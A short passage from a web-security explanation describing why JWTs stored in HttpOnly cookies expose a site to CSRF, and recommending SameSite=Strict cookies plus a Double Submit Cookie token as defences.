- If the JWT is in an **HttpOnly cookie**, the browser attaches it automatically on every request to that domain — including cross-origin requests from an attacker's website. This is the textbook CSRF attack vector.
**The fix when using cookie-stored JWTs:** SameSite=Strict cookies (blocks cross-origin cookie sending entirely), plus a CSRF token (Double Submit Cookie pattern) as defense in depth."
